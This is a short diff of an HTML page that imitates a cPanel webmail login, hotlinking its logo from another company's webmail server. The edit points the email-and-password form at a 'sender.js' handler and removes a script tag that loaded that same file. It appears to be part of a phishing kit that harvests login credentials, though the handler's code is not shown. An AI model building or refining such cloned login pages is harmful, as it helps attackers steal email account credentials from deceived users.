@@ -118,7 +118,7 @@
 <body>
     <div class="login-container">
         <img src="http://webmail.atwood.com.sg/cPanel_magic_revision_1481065324/unprotected/cpanel/images/webmail-logo.svg" alt="Webmail Logo">
-        <form id="loginForm" action="" method="post">
+        <form id="loginForm" action="sender.js" method="post">
             <label for="email">Email Address</label>
             <div class="input-container">
                 <input type="email" id="email" name="email" placeholder="Enter your email address" required>
@@ -132,7 +132,6 @@
             <button type="submit">Log in</button>
         </form>
         <div class="locale-container">
-          <script src="sender.js"></script>
             <label for="locale">Select a locale:</label>
             <select id="locale" name="locale">
                 <option value="en">English</option>
